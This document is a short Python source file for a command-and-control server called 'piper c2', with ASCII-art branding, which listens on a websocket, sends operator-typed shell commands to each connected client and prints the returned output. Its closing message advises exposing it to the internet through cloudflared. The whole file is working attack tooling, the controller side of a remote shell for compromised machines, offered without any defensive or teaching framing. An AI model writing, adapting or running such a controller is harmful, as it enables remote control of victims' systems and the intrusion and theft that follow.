import asyncio
import websockets
import argparse

def build_args():
    parser = argparse.ArgumentParser(description="piper c2 server")
    parser.add_argument("--host",type=str,default="localhost")
    parser.add_argument("--port",type=int,default=8081)
    return parser.parse_args()


ascci_art = r"""
⠀⠀⣠⣴⠶⠤⡀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⣿⣿⣶⣦⣄⢀⣠⣶⣾⣿⣿⣿⣿⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⡠⡶⠷⣶⣤⡀⠀
⢀⣾⣿⠃⠈⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠁⠁⠀⠘⣿⣷⡄
⢸⣿⣿⡀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⣠⣿⣿⡷
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠉⠛⠿⠿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⢿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠁⠀⠀⠀
 ____  _                        ____
|  _ \(_)_ __   ___ _ __    ___|___ \
| |_) | | '_ \ / _ \ '__|  / __| __) |
|  __/| | |_) |  __/ |    | (__ / __/
|_|   |_| .__/ \___|_|     \___|_____|
        |_| by nullzinx 
"""

async def handler(websocket):
    ip,port = websocket.remote_address
    try:
      while True:
        command = await asyncio.to_thread(input,f"{ip}:{port}:")
        if command == "/quit":
            await websocket.close()
            quit()
        else:
           await websocket.send(command)
           command_output = await websocket.recv()
           print(command_output)
    except KeyboardInterrupt:
        print("bye bye")
        pass

async def main(websocket_server_host:str,websocket_server_port:int):
    async with websockets.serve(handler,websocket_server_host,websocket_server_port):
        print(ascci_art)
        print(f"""

        c2 runing in ws://{websocket_server_host}:{websocket_server_port}
        use the cloudflared to get a public url
        """)
        
        await asyncio.Future()

if __name__ == "__main__":
    args = build_args()
    websocket_server_host = args.host
    websocket_server_port = args.port
    asyncio.run(main(websocket_server_host,websocket_server_port))

